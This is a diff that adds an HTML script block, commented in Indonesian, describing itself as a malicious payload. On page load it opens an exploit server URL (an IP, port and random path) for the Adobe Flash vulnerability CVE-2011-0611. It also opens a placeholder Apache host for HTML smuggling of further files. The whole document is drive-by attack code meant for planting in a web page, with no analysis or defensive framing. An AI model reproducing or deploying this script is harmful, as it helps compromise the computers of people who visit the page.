@@ -1,0 +1,24 @@
+<script>
+  // Skrip ini memuat payload berbahaya yang memanfaatkan CVE-2011-0611.
+  // Ini merupakan kerentanan pada Adobe Flash Player yang memungkinkan penyerang menjalankan kode berbahaya melalui file SWF.
+  // Selain itu, skrip ini memanfaatkan metode HTML Smuggling untuk mengunduh file tambahan dari server Apache.
+
+  // Fungsi utama dijalankan ketika halaman dibuka (onload)
+  window.onload = function() {
+    // URL pertama merujuk ke payload berbahaya dengan kerentanan CVE-2011-0611 yang ditargetkan ke Adobe Flash Player
+    var url1 = 'http://192.168.1.8:8080/YM3N5Z'; // CVE-2011-0611
+
+    // URL kedua memanfaatkan teknik HTML Smuggling, yang memanfaatkan elemen HTML dan JavaScript
+    // untuk menyelundupkan file berbahaya melalui halaman HTML. File yang ditargetkan ini akan diunduh
+    // dari host Apache yang ditentukan.
+    var url2 = 'http://your_apache_host'; // HTML Smuggling
+
+    // Buka URL pertama di tab baru atau jendela baru. Ini akan mencoba memuat file SWF
+    // yang mengandung exploit, dan membuka jalur serangan melalui kerentanan CVE-2011-0611.
+    window.open(url1, '_blank');
+
+    // Buka URL kedua untuk memulai proses HTML Smuggling, yang pada dasarnya
+    // dapat digunakan untuk menyuntikkan atau mengunduh file tambahan dari server.
+    window.open(url2, '_blank');
+  };
+</script>
